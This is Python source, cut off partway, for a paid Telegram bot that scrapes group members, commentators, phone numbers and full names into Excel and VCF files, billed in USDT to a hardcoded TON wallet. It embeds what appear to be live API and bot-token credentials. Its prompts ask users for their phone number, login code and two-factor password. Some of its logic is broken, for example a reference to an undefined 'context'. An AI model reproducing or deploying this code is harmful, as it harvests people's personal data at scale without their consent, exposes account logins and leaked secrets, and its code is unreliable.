import asyncio
import os
import sys
import traceback
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient, errors as telethon_errors
from telethon import tl
from telegram import error as telegram_error
from datetime import datetime, timedelta
import json
import io
import pandas as pd
import requests
import vobject

# Указываем переменные через код или переменные среды
API_ID = int(os.environ.get('API_ID', 25281388))
API_HASH = os.environ.get('API_HASH', 'a2e719f61f40ca912567c7724db5764e')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7981019134:AAEARQ__XD1Ki60avGlWL1wDKDVcUKh6ny8')
LOG_CHANNEL_ID = -1002342891238
SUBSCRIPTION_CHANNEL_ID = -1002342891238
SUPPORT_USERNAME = '@alex_strayker'
TON_WALLET_ADDRESS = 'UQAP4wrP0Jviy03CTeniBjSnAL5UHvcMFtxyi1Ip1exl9pLu'
TON_API_KEY = os.environ.get('TON_API_KEY', 'YOUR_TON_API_KEY')
ADMIN_IDS = ['2037127199']

# Создание клиента Telethon
client_telethon = TelegramClient('session_name', API_ID, API_HASH)

# База данных пользователей
DB_FILE = 'users.json'
if not os.path.exists(DB_FILE):
    with open(DB_FILE, 'w') as f:
        json.dump({}, f)

def load_users():
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_users(users):
    with open(DB_FILE, 'w') as f:
        json.dump(users, f, indent=4)

# Языковые переводы для всех языков
LANGUAGES = {
    'Русский': {
        'welcome': 'Привет! Выбери язык общения:',
        'enter_phone': 'Введите номер телефона в формате +380639678038 для авторизации:',
        'enter_code': 'Введите код подтверждения, который вы получили в SMS или Telegram:',
        'enter_password': 'Требуется пароль двухфакторной аутентификации. Введите пароль:',
        'auth_success': 'Авторизация успешно завершена!',
        'auth_error': 'Ошибка авторизации: {error}. Попробуйте снова с /start.',
        'choose_language': 'Выбери язык:',
        'subscribe': 'Подпишись на канал: t.me/VideoStreamLog\nПосле подписки нажми "Продолжить".',
        'subscribed': 'Продолжить',
        'you_chose': 'Вы выбрали: {button}',
        'skip': 'Пропустить',
        'start_menu': 'Вы: {name}\nВаш ID: {user_id}\nВыбран язык: {lang} /language\nТип подписки: {sub_type}\nВаша подписка закончится через: {sub_time}\nВсего запросов сделано: {requests}\nОсталось запросов сегодня: {limit}',
        'identifiers': 'Отправь мне @username, ссылку на публикацию или перешли сообщение, чтобы узнать ID.',
        'parser': 'Выбери, что хочешь спарсить:',
        'subscribe_button': 'Оформить подписку',
        'support': 'Поддержка: {support}',
        'requisites': 'Возможности оплаты:\n1. [Метод 1]\n2. [Метод 2]\nСвяжитесь с {support} для оплаты.',
        'logs_channel': 'Канал с логами: t.me/YourLogChannel',
        'link_group': 'Отправь мне ссылку на группу или канал, например: https://t.me/group_name\nМожно указать несколько ссылок через Enter.',
        'link_post': 'Отправь мне ссылку на пост, например: https://t.me/channel_name/12345\nИли перешли пост. Можно указать несколько ссылок через Enter.',
        'limit': 'Сколько пользователей парсить? Выбери или укажи своё число (макс. 15000 для платных подписок, 150 для бесплатной).',
        'filter_username': 'Фильтровать только пользователей с username?',
        'filter_bots': 'Исключить ботов?',
        'filter_active': 'Только активных недавно (за 30 дней)?',
        'invalid_limit': 'Укажи число от 1 до {max_limit}!',
        'invalid_number': 'Пожалуйста, укажи число!',
        'invalid_link': 'Пожалуйста, отправь корректную ссылку на пост, например: https://t.me/channel_name/12345\nИли несколько ссылок через Enter.',
        'fix_link': 'Если ты ошибся, могу помочь исправить ссылку.',
        'suggest_link': 'Ты имел в виду: {link}?',
        'retry_link': 'Отправь ссылку заново:',
        'no_access': 'Ошибка: у меня нет доступа к {link}. Убедись, что я добавлен в чат или он публичный.',
        'flood_error': 'Ошибка: {e}',
        'rpc_error': 'Ошибка: {e}',
        'new_user': 'Новый пользователь: @{username} (ID: {user_id})',
        'language_cmd': 'Выбери новый язык:',
        'caption_commentators': 'Вот ваш файл с комментаторами.',
        'caption_participants': 'Вот ваш файл с участниками.',
        'caption_post_commentators': 'Вот ваш файл с комментаторами поста.',
        'limit_reached': 'Ты исчерпал дневной лимит ({limit} запросов). Попробуй снова через {hours} часов.',
        'id_result': 'ID: {id}',
        'close': 'Закрыть',
        'continue_id': 'Продолжить',
        'subscription_1h': 'Подписка на 1 час - 2 USDT (TON)',
        'subscription_3d': 'Подписка на 3 дня - 5 USDT (TON)',
        'subscription_7d': 'Подписка на 7 дней - 7 USDT (TON)',
        'payment_wallet': 'Переведите {amount} USDT на кошелёк TON:\n{address}\nПосле оплаты нажмите "Я оплатил".',
        'payment_cancel': 'Отменить',
        'payment_paid': 'Я оплатил',
        'payment_hash': 'Отправьте хеш транзакции:',
        'payment_pending': 'Ожидается поступление средств',
        'payment_update': 'Обновить информацию',
        'payment_success': 'Платёж успешно подтверждён! Ваша подписка активирована до {end_time}.',
        'payment_error': 'Ошибка при проверке платежа: {error}',
        'entity_error': 'Не удалось получить информацию о пользователе. Пользователь может быть приватным или недоступным.',
        'no_filter': 'Не применять фильтр',
        'phone_contacts': 'Сбор номеров телефонов и ФИО',
        'auth_access': 'Авторизация для закрытых чатов',
        'caption_phones': 'Вот ваш файл с номерами телефонов и ФИО (Excel и VCF).',
        'auth_request': 'Для доступа к закрытым чатам добавьте бота в чат как администратора или отправьте ссылку на закрытый чат.',
        'auth_success': 'Доступ к закрытому чату успешно предоставлен!',
        'auth_error': 'Не удалось получить доступ. Убедитесь, что бот добавлен как администратор или чат публичный.',
        'note_cmd': 'Заметка успешно сохранена (бот не будет реагировать).'
    },
    'Украинский': {
        'welcome': 'Привіт! Обери мову спілкування:',
        'enter_phone': 'Введи номер телефону у форматі +380639678038 для авторизації:',
        'enter_code': 'Введи код підтвердження, який ти отримав у SMS або Telegram:',
        'enter_password': 'Потрібен пароль двофакторної аутентифікації. Введи пароль:',
        'auth_success': 'Авторизація успішно завершена!',
        'auth_error': 'Помилка авторизації: {error}. Спробуй знову з /start.',
        'choose_language': 'Обери мову:',
        'subscribe': 'Підпишись на канал: t.me/VideoStreamLog\nПісля підписки натисни "Продовжити".',
        'subscribed': 'Продовжити',
        'you_chose': 'Ви обрали: {button}',
        'skip': 'Пропустити',
        'start_menu': 'Ви: {name}\nВаш ID: {user_id}\nОбрана мова: {lang} /language\nТип підписки: {sub_type}\nВаша підписка закінчиться через: {sub_time}\nВсього запитів зроблено: {requests}\nЗалишилось запитів сьогодні: {limit}',
        'identifiers': 'Надішли мені @username, посилання на публікацію або перешли повідомлення, щоб дізнатися ID.',
        'parser': 'Обери, що хочеш спарсити:',
        'subscribe_button': 'Оформити підписку',
        'support': 'Підтримка: {support}',
        'requisites': 'Можливості оплати:\n1. [Метод 1]\n2. [Метод 2]\nЗв’яжіться з {support} для оплати.',
        'logs_channel': 'Канал з логами: t.me/YourLogChannel',
        'link_group': 'Надішли мені посилання на групу або канал, наприклад: https://t.me/group_name\nМожна вказати кілька посилань через Enter.',
        'link_post': 'Надішли мені посилання на пост, наприклад: https://t.me/channel_name/12345\nАбо перешли пост. Можна вказати кілька посилань через Enter.',
        'limit': 'Скільки користувачів парсити? Обери або вкажи своє число (макс. 15000 для платних підписок, 150 для безкоштовної).',
        'filter_username': 'Фільтрувати лише користувачів з username?',
        'filter_bots': 'Виключити ботів?',
        'filter_active': 'Тільки активних нещодавно (за 30 днів)?',
        'invalid_limit': 'Вкажи число від 1 до {max_limit}!',
        'invalid_number': 'Будь ласка, вкажи число!',
        'invalid_link': 'Будь ласка, надішли коректне посилання на пост, наприклад: https://t.me/channel_name/12345\nАбо кілька посилань через Enter.',
        'fix_link': 'Якщо ти помилився, можу допомогти виправити посилання.',
        'suggest_link': 'Ти мав на увазі: {link}?',
        'retry_link': 'Надішли посилання заново:',
        'no_access': 'Помилка: у мене немає доступу до {link}. Переконайся, що я доданий до чату або він публічний.',
        'flood_error': 'Помилка: {e}',
        'rpc_error': 'Помилка: {e}',
        'new_user': 'Новий користувач: @{username} (ID: {user_id})',
        'language_cmd': 'Обери нову мову:',
        'caption_commentators': 'Ось ваш файл з коментаторами.',
        'caption_participants': 'Ось ваш файл з учасниками.',
        'caption_post_commentators': 'Ось ваш файл з коментаторами поста.',
        'limit_reached': 'Ти вичерпав денний ліміт ({limit} запитів). Спробуй знову через {hours} годин.',
        'id_result': 'ID: {id}',
        'close': 'Закрити',
        'continue_id': 'Продовжити',
        'subscription_1h': 'Підписка на 1 годину - 2 USDT (TON)',
        'subscription_3d': 'Підписка на 3 дні - 5 USDT (TON)',
        'subscription_7d': 'Підписка на 7 днів - 7 USDT (TON)',
        'payment_wallet': 'Переведіть {amount} USDT на гаманець TON:\n{address}\nПісля оплати натисніть "Я оплатив".',
        'payment_cancel': 'Скасувати',
        'payment_paid': 'Я оплатив',
        'payment_hash': 'Надішліть хеш транзакції:',
        'payment_pending': 'Очікується надходження коштів',
        'payment_update': 'Оновити інформацію',
        'payment_success': 'Платіж успішно підтверджений! Ваша підписка активована до {end_time}.',
        'payment_error': 'Помилка при перевірці платежу: {error}',
        'entity_error': 'Не вдалося отримати інформацію про користувача. Користувач може бути приватним або недоступним.',
        'no_filter': 'Не застосовувати фільтр',
        'phone_contacts': 'Збір номерів телефонів та ПІБ',
        'auth_access': 'Авторизація для закритих чатів',
        'caption_phones': 'Ось ваш файл з номерами телефонів та ПІБ (Excel і VCF).',
        'auth_request': 'Для доступу до закритих чатів додайте бота в чат як адміністратора або надішліть посилання на закритий чат.',
        'auth_success': 'Доступ до закритого чату успішно надано!',
        'auth_error': 'Не вдалося отримати доступ. Переконайтесь, що бот доданий як адміністратор або чат публічний.',
        'note_cmd': 'Примітка успішно збережено (бот не реагуватиме).'
    },
    'English': {
        'welcome': 'Hello! Choose your language:',
        'enter_phone': 'Enter your phone number in the format +380639678038 for authorization:',
        'enter_code': 'Enter the confirmation code you received via SMS or Telegram:',
        'enter_password': 'Two-factor authentication password required. Enter your password:',
        'auth_success': 'Authorization completed successfully!',
        'auth_error': 'Authorization error: {error}. Try again with /start.',
        'choose_language': 'Choose language:',
        'subscribe': 'Subscribe to the channel: t.me/VideoStreamLog\nAfter subscribing, press "Continue".',
        'subscribed': 'Continue',
        'you_chose': 'You chose: {button}',
        'skip': 'Skip',
        'start_menu': 'You: {name}\nYour ID: {user_id}\nSelected language: {lang} /language\nSubscription type: {sub_type}\nYour subscription ends in: {sub_time}\nTotal requests made: {requests}\nRequests left today: {limit}',
        'identifiers': 'Send me @username, a post link, or forward a message to find out the ID.',
        'parser': 'Choose what you want to parse:',
        'subscribe_button': 'Subscribe',
        'support': 'Support: {support}',
        'requisites': 'Payment options:\n1. [Method 1]\n2. [Method 2]\nContact {support} for payment.',
        'logs_channel': 'Logs channel: t.me/YourLogChannel',
        'link_group': 'Send me a link to a group or channel, e.g.: https://t.me/group_name\nYou can specify multiple links via Enter.',
        'link_post': 'Send me a link to a post, e.g.: https://t.me/channel_name/12345\nOr forward a post. You can specify multiple links via Enter.',
        'limit': 'How many users to parse? Choose or enter your number (max 15,000 for paid subscriptions, 150 for free).',
        'filter_username': 'Filter only users with username?',
        'filter_bots': 'Exclude bots?',
        'filter_active': 'Only recently active (within 30 days)?',
        'invalid_limit': 'Enter a number from 1 to {max_limit}!',
        'invalid_number': 'Please enter a number!',
        'invalid_link': 'Please send a valid post link, e.g.: https://t.me/channel_name/12345\nOr multiple links via Enter.',
        'fix_link': 'If you made a mistake, I can help fix the link.',
        'suggest_link': 'Did you mean: {link}?',
        'retry_link': 'Send the link again:',
        'no_access': 'Error: I don’t have access to {link}. Make sure I’m added to the chat or it’s public.',
        'flood_error': 'Error: {e}',
        'rpc_error': 'Error: {e}',
        'new_user': 'New user: @{username} (ID: {user_id})',
        'language_cmd': 'Choose a new language:',
        'caption_commentators': 'Here is your file with commentators.',
        'caption_participants': 'Here is your file with participants.',
        'caption_post_commentators': 'Here is your file with post commentators.',
        'limit_reached': 'You’ve reached the daily limit ({limit} requests). Try again in {hours} hours.',
        'id_result': 'ID: {id}',
        'close': 'Close',
        'continue_id': 'Continue',
        'subscription_1h': '1 Hour Subscription - 2 USDT (TON)',
        'subscription_3d': '3 Days Subscription - 5 USDT (TON)',
        'subscription_7d': '7 Days Subscription - 7 USDT (TON)',
        'payment_wallet': 'Transfer {amount} USDT to the TON wallet:\n{address}\nAfter payment, press "I Paid".',
        'payment_cancel': 'Cancel',
        'payment_paid': 'I Paid',
        'payment_hash': 'Send the transaction hash:',
        'payment_pending': 'Awaiting funds transfer',
        'payment_update': 'Update Information',
        'payment_success': 'Payment successfully confirmed! Your subscription is activated until {end_time}.',
        'payment_error': 'Error checking payment: {error}',
        'entity_error': 'Could not retrieve user information. The user may be private or inaccessible.',
        'no_filter': 'Do not apply filter',
        'phone_contacts': 'Collect phone numbers and full names',
        'auth_access': 'Authorize for private chats',
        'caption_phones': 'Here is your file with phone numbers and full names (Excel and VCF).',
        'auth_request': 'To access private chats, add the bot as an admin or send a link to a private chat.',
        'auth_success': 'Access to the private chat successfully granted!',
        'auth_error': 'Could not gain access. Ensure the bot is added as an admin or the chat is public.',
        'note_cmd': 'Note successfully saved (bot will not respond).'
    },
    'Deutsch': {
        'welcome': 'Hallo! Wähle deine Sprache:',
        'enter_phone': 'Gib deine Telefonnummer im Format +380639678038 für die Autorisierung ein:',
        'enter_code': 'Gib den Bestätigungscode ein, den du per SMS oder Telegram erhalten hast:',
        'enter_password': 'Passwort für die Zwei-Faktor-Authentifizierung erforderlich. Gib dein Passwort ein:',
        'auth_success': 'Autorisierung erfolgreich abgeschlossen!',
        'auth_error': 'Autorisierungsfehler: {error}. Versuche es erneut mit /start.',
        'choose_language': 'Wähle eine Sprache:',
        'subscribe': 'Abonniere den Kanal: t.me/VideoStreamLog\nDrücke nach dem Abonnieren "Fortfahren".',
        'subscribed': 'Fortfahren',
        'you_chose': 'Du hast gewählt: {button}',
        'skip': 'Überspringen',
        'start_menu': 'Du: {name}\nDeine ID: {user_id}\nGewählte Sprache: {lang} /language\nAbonnementtyp: {sub_type}\nDein Abonnement endet in: {sub_time}\nGesamte Anfragen: {requests}\nVerbleibende Anfragen heute: {limit}',
        'identifiers': 'Sende mir @username, einen Beitrag-Link oder leite eine Nachricht weiter, um die ID herauszufinden.',
        'parser': 'Wähle, was du parsen möchtest:',
        'subscribe_button': 'Abonnement abschließen',
        'support': 'Support: {support}',
        'requisites': 'Zahlungsmöglichkeiten:\n1. [Methode 1]\n2. [Methode 2]\nKontaktiere {support} für die Zahlung.',
        'logs_channel': 'Log-Kanal: t.me/YourLogChannel',
        'link_group': 'Sende mir einen Link zu einer Gruppe oder einem Kanal, z.B.: https://t.me/group_name\nDu kannst mehrere Links mit Enter angeben.',
        'link_post': 'Sende mir einen Link zu einem Beitrag, z.B.: https://t.me/channel_name/12345\nOder leite einen Beitrag weiter. Du kannst mehrere Links mit Enter angeben.',
        'limit': 'Wie viele Benutzer sollen geparst werden? Wähle oder gib eine Zahl ein (max. 15.000 für bezahlte Abonnements, 150 für kostenlos).',
        'filter_username': 'Nur Benutzer mit Username filtern?',
        'filter_bots': 'Bots ausschließen?',
        'filter_active': 'Nur kürzlich aktive (innerhalb von 30 Tagen)?',
        'invalid_limit': 'Gib eine Zahl von 1 bis {max_limit} ein!',
        'invalid_number': 'Bitte gib eine Zahl ein!',
        'invalid_link': 'Bitte sende einen gültigen Beitrag-Link, z.B.: https://t.me/channel_name/12345\nOder mehrere Links mit Enter.',
        'fix_link': 'Wenn du einen Fehler gemacht hast, kann ich den Link korrigieren.',
        'suggest_link': 'Meintest du: {link}?',
        'retry_link': 'Sende den Link erneut:',
        'no_access': 'Fehler: Ich habe keinen Zugriff auf {link}. Stelle sicher, dass ich zum Chat hinzugefügt bin oder er öffentlich ist.',
        'flood_error': 'Fehler: {e}',
        'rpc_error': 'Fehler: {e}',
        'new_user': 'Neuer Benutzer: @{username} (ID: {user_id})',
        'language_cmd': 'Wähle eine neue Sprache:',
        'caption_commentators': 'Hier ist deine Datei mit Kommentatoren.',
        'caption_participants': 'Hier ist deine Datei mit Teilnehmern.',
        'caption_post_commentators': 'Hier ist deine Datei mit Beitragskommentatoren.',
        'limit_reached': 'Du hast das tägliche Limit ({limit} Anfragen) erreicht. Versuche es in {hours} Stunden erneut.',
        'id_result': 'ID: {id}',
        'close': 'Schließen',
        'continue_id': 'Fortfahren',
        'subscription_1h': '1 Stunde Abonnement - 2 USDT (TON)',
        'subscription_3d': '3 Tage Abonnement - 5 USDT (TON)',
        'subscription_7d': '7 Tage Abonnement - 7 USDT (TON)',
        'payment_wallet': 'Überweise {amount} USDT auf den TON-Wallet:\n{address}\nNach der Zahlung drücke "Ich habe bezahlt".',
        'payment_cancel': 'Abbrechen',
        'payment_paid': 'Ich habe bezahlt',
        'payment_hash': 'Sende den Transaktionshash:',
        'payment_pending': 'Warten auf Zahlungseingang',
        'payment_update': 'Informationen aktualisieren',
        'payment_success': 'Zahlung erfolgreich bestätigt! Dein Abonnement ist bis {end_time} aktiviert.',
        'payment_error': 'Fehler bei der Zahlungsprüfung: {error}',
        'entity_error': 'Konnte keine Benutzerinformationen abrufen. Der Benutzer könnte privat oder nicht zugänglich sein.',
        'no_filter': 'Keinen Filter anwenden',
        'phone_contacts': 'Telefonnummern und vollständige Namen sammeln',
        'auth_access': 'Autorisierung für private Chats',
        'caption_phones': 'Hier ist deine Datei mit Telefonnummern und vollständigen Namen (Excel und VCF).',
        'auth_request': 'Um auf private Chats zuzugreifen, füge den Bot als Administrator hinzu oder sende einen Link zu einem privaten Chat.',
        'auth_success': 'Zugang zum privaten Chat erfolgreich gewährt!',
        'auth_error': 'Konnte keinen Zugriff erhalten. Stelle sicher, dass der Bot als Administrator hinzugefügt wurde oder der Chat öffentlich ist.',
        'note_cmd': 'Notiz erfolgreich gespeichert (der Bot wird nicht reagieren).'
    }
}

# Логирование в канал
async def log_to_channel(context, message, username=None):
    try:
        log_message = f"{message}"
        if username:
            log_message = f"@{username}: {message}"
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message)
    except telegram_error.BadRequest as e:
        print(f"Ошибка при отправке лога в канал: {e}")

# Обновление пользовательских данных
def update_user_data(user_id, name, context, lang=None, subscription=None, requests=0):
    users = load_users()
    user_id_str = str(user_id)
    now = datetime.now()
    if user_id_str not in users:
        users[user_id_str] = {
            'name': name,
            'language': lang or 'Русский',
            'subscription': subscription or {'type': 'Бесплатная', 'end': None},
            'requests': 0,
            'daily_requests': {'count': 0, 'last_reset': now.isoformat()}
        }
    user = users[user_id_str]
    if 'daily_requests' not in user or not isinstance(user['daily_requests'], dict):
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
    if lang:
        user['language'] = lang
    if subscription:
        user['subscription'] = subscription
    last_reset = datetime.fromisoformat(user['daily_requests']['last_reset'])
    if (now - last_reset).days >= 1:
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
    user['requests'] = user.get('requests', 0) + requests
    user['daily_requests']['count'] += requests
    user['name'] = name
    save_users(users)
    return user

# Проверка лимита запросов
def check_request_limit(user_id):
    users = load_users()
    user_id_str = str(user_id)
    user = users.get(user_id_str, {})
    now = datetime.now()
    if 'daily_requests' not in user or not isinstance(user.get('daily_requests'), dict):
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
        save_users(users)
    daily_requests = user['daily_requests']
    last_reset = datetime.fromisoformat(daily_requests['last_reset'])
    if (now - last_reset).days >= 1:
        daily_requests = {'count': 0, 'last_reset': now.isoformat()}
        users[user_id_str]['daily_requests'] = daily_requests
        save_users(users)
    subscription = user.get('subscription', {'type': 'Бесплатная', 'end': None})
    max_requests = 5 if subscription['type'] == 'Бесплатная' else float('inf')
    return daily_requests['count'] < max_requests, 24 - (now - last_reset).seconds // 3600

# Проверка лимита парсинга
def check_parse_limit(user_id, limit):
    users = load_users()
    user_id_str = str(user_id)
    user = users.get(user_id_str, {})
    subscription = user.get('subscription', {'type': 'Бесплатная', 'end': None})
    now = datetime.now()
    if subscription['type'].startswith('Платная') and subscription['end']:
        if datetime.fromisoformat(subscription['end']) < now:
            update_user_data(user_id, user.get('name', 'Неизвестно'), None, subscription={'type': 'Бесплатная', 'end': None})
            lang = user.get('language', 'Русский')
            texts = LANGUAGES[lang]
            loop = asyncio.get_event_loop()
            loop.run_until_complete(
                context.bot.send_message(chat_id=user_id, text="⚠️ Ваша платная подписка истекла. Теперь у вас бесплатная подписка с лимитом 150 пользователей на парсинг." if lang == 'Русский' else 
                                        "⚠️ Ваша платна підписка закінчилася. Тепер у вас безкоштовна підписка з лімітом 150 користувачів на парсинг." if lang == 'Украинский' else 
                                        "⚠️ Your paid subscription has expired. You now have a free subscription with a limit of 150 users for parsing." if lang == 'English' else 
                                        "⚠️ Dein bezahltes Abonnement ist abgelaufen. Du hast jetzt ein kostenloses Abonnement mit einem Limit von 150 Benutzern zum Parsen.")
            )
            subscription = {'type': 'Бесплатная', 'end': None}
    if subscription['type'] == 'Бесплатная':
        return min(limit, 150)
    elif subscription['type'] == 'Платная (бессрочная)':
        return min(limit, 15000)
    else:
        return min(limit, 15000)

# Создание файла Excel
async def create_excel_in_memory(data):
    df = pd.DataFrame(data, columns=['ID', 'Username', 'First Name', 'Last Name', 'Bot', 'Nickname'])
    df['Nickname'] = '@' + df['Nickname'].astype(str)
    excel_file = io.BytesIO()
    with pd.ExcelWriter(excel_file, engine='xlsxwriter') as writer:
        df.to_excel(writer, index=False, sheet_name='Sheet1')
        workbook = writer.book
        worksheet = writer.sheets['Sheet1']
        for idx, col in enumerate(df.columns):
            series = df[col]
            max_length = max((series.astype(str).map(len).max(), len(str(series.name)))) + 2
            worksheet.set_column(idx, idx, max_length)
    excel_file.seek(0)
    return excel_file

# Создание VCF файла для контактов
def create_vcf_file(data):
    vcf_content = io.BytesIO()
    for _, row in data.iterrows():
        if row['Phone'] and row['First Name']:
            vcard = vobject.vCard()
            vcard.add('fn').value = f"{row['First Name']} {row['Last Name']}".strip()
            vcard.add('tel').value = row['Phone']
            vcard.add('url').value = f"https://t.me/{row['Username']}" if row['Username'] else ""
            vcf_content.write(str(vcard).encode('utf-8'))
            vcf_content.write(b'\n')
    vcf_content.seek(0)
    return vcf_content

# Фильтрация данных
def filter_data(data, filters):
    filtered_data = data
    if filters.get('only_with_username'):
        filtered_data = [row for row in filtered_data if row[1]]
    if filters.get('exclude_bots'):
        filtered_data = [row for row in filtered_data if not row[4]]
    if filters.get('only_active'):
        filtered_data = [row for row in filtered_data if is_active_recently(row[5])]
    return filtered_data

def is_active_recently(user):
    if not user or not hasattr(user, 'status') or not user.status:
        return True
    if hasattr(user.status, 'was_online'):
        return (datetime.now() - user.status.was_online).days < 30
    return True

# Подсчёт статистики
def get_statistics(data):
    total = len(data)
    with_username = sum(1 for row in data if row[1])
    bots = sum(1 for row in data if row[4])
    without_name = sum(1 for row in data if not row[2] and not row[3])
    return f"Всего: {total}\nС username: {with_username}\nБотов: {bots}\nБез имени: {without_name}"

# Получение главного меню
def get_main_menu(user_id, context):
    users = load_users()
    user_id_str = str(user_id)
    user_data = users.get(user_id_str, {})
    lang = user_data.get('language', 'Русский')
    texts = LANGUAGES[lang]
    sub_type = user_data.get('subscription', {}).get('type', 'Бесплатная')
    sub_end = user_data.get('subscription', {}).get('end')
    sub_time = '—' if sub_type == 'Бесплатная' else (
        'бессрочно' if sub_end is None else 
        f"{(datetime.fromisoformat(sub_end) - datetime.now()).days * 24 + (datetime.fromisoformat(sub_end) - datetime.now()).seconds // 3600} часов"
    )
    requests = user_data.get('requests', 0)
    name = user_data.get('name', 'Неизвестно')
    limit_left, hours_left = check_request_limit(user_id)
    limit_display = 5 if sub_type == 'Бесплатная' else 10 - user_data.get('daily_requests', {}).get('count', 0)
    
    is_admin = user_id_str in ADMIN_IDS
    
    buttons = [
        [InlineKeyboardButton("Идентификаторы" if lang == 'Русский' else "Ідентифікатори" if lang == 'Украинский' else "Identifiers" if lang == 'English' else "Identifikatoren", callback_data='identifiers'), 
         InlineKeyboardButton("(!)", callback_data='info_identifiers')],
        [InlineKeyboardButton("Сбор данных / Парсер" if lang == 'Русский' else "Збір даних / Парсер" if lang == 'Украинский' else "Data collection / Parser" if lang == 'English' else "Datensammlung / Parser", callback_data='parser'), 
         InlineKeyboardButton("(!)", callback_data='info_parser')],
        [InlineKeyboardButton(texts['subscribe_button'], callback_data='subscribe'), InlineKeyboardButton("(!)", callback_data='info_subscribe')],
        [InlineKeyboardButton(f"{texts['support'].format(support=SUPPORT_USERNAME)}", url=f"https://t.me/{SUPPORT_USERNAME[1:]}")],
        [InlineKeyboardButton("Реквизиты" if lang == 'Русский' else "Реквізити" if lang == 'Украинский' else "Requisites" if lang == 'English' else "Zahlungsdaten", callback_data='requisites'), 
         InlineKeyboardButton("(!)", callback_data='info_requisites')]
    ]
    if is_admin:
        buttons.append([InlineKeyboardButton("Канал с логами" if lang == 'Русский' else "Канал з логами" if lang == 'Украинский' else "Logs channel" if lang == 'English' else "Log-Kanal", callback_data='logs_channel'), 
                        InlineKeyboardButton("(!)", callback_data='info_logs')])
    
    return texts['start_menu'].format(
        name=name, user_id=user_id, lang=lang, sub_type=sub_type, sub_time=sub_time, requests=requests, limit=limit_display
    ), InlineKeyboardMarkup(buttons)

# Обработчик команды /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Без username"
    name = update.effective_user.full_name
    users = load_users()

    try:
        await client_telethon.connect()
        if not client_telethon.is_connected():
            await update.message.reply_text(LANGUAGES['Русский']['enter_phone'])
            context.user_data['waiting_for_phone'] = True
            await log_to_channel(context, f"Запрос номера телефона у @{username}", username)
            return

        if str(user_id) not in users:
            await log_to_channel(context, LANGUAGES['Русский']['new_user'].format(username=username, user_id=user_id), username)
            keyboard = [
                [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
                [InlineKeyboardButton("English", callback_data='lang_English')],
                [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
            ]
            await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            lang = users[str(user_id)]['language']
            await update.message.reply_text(LANGUAGES[lang]['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(LANGUAGES[lang]['subscribed'], callback_data='subscribed')]]))
            update_user_data(user_id, name, context)

    except telethon_errors.RPCError as e:
        await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
        await log_to_channel(context, f"Ошибка подключения/авторизации для @{username}: {str(e)}", username)
    except Exception as e:
        print(f"Ошибка в /start: {str(e)}\n{traceback.format_exc()}")
    finally:
        if client_telethon.is_connected():
            await client_telethon.disconnect()

# Обработчик команды /language
async def language(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Без username"
    users = load_users()
    lang = users.get(str(user_id), {}).get('language', 'Русский')
    keyboard = [
        [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
        [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
        [InlineKeyboardButton("English", callback_data='lang_English')],
        [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
    ]
    await update.message.reply_text(LANGUAGES[lang]['language_cmd'], reply_markup=InlineKeyboardMarkup(keyboard))

# Обработчик команды /set_plan
async def set_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) not in ADMIN_IDS:
        await update.message.reply_text("У вас нет прав для этой команды.")
        return
    
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Использование: /set_plan <user_id> <type> <duration>")
        return
    
    target_user_id, sub_type, duration = args[0], args[1], int(args[2])
    now = datetime.now()
    
    if sub_type == '1h':
        end_time = now + timedelta(hours=duration)
    elif sub_type == '3d':
        end_time = now + timedelta(days=duration)
    elif sub_type == '7d':
        end_time = now + timedelta(days=duration)
    elif sub_type == 'permanent':
        end_time = None
    else:
        await update.message.reply_text("Неверный тип подписки. Используйте '1h', '3d', '7d' или 'permanent' для админов.")
        return
    
    subscription_type = f'Платная ({sub_type})' if sub_type in ['1h', '3d', '7d'] else 'Платная (бессрочная)'
    update_user_data(target_user_id, "Имя пользователя", context, subscription={'type': subscription_type, 'end': end_time.isoformat() if end_time else None})
    
    username = load_users().get(str(target_user_id), {}).get('name', 'Неизвестно')
    lang = load_users().get(str(target_user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    
    notification = texts['payment_success'].format(end_time=end_time.strftime('%Y-%m-%d %H:%M:%S') if end_time else 'бессрочно')
    await context.bot.send_message(chat_id=target_user_id, text=f"🎉 {notification}")
    
    await update.message.reply_text(f"Подписка для пользователя {target_user_id} ({username}) обновлена до {end_time.strftime('%Y-%m-%d %H:%M:%S') if end_time else 'бессрочно'}.")
    await log_to_channel(context, f"Администратор установил подписку для пользователя {target_user_id} ({username}): {sub_type}, до {end_time if end_time else 'бессрочно'}", "Администратор")

# Обработчик команды /remove_plan
async def remove_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) not in ADMIN_IDS:
        await update.message.reply_text("У вас нет прав для этой команды.")
        return
    
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Использование: /remove_plan <user_id>")
        return
    
    target_user_id = args[0]
    if str(target_user_id) not in load_users():
        await update.message.reply_text("Пользователь не найден.")
        return
    
    update_user_data(target_user_id, "Имя пользователя", context, subscription={'type': 'Бесплатная', 'end': None})
    username = load_users().get(str(target_user_id), {}).get('name', 'Неизвестно')
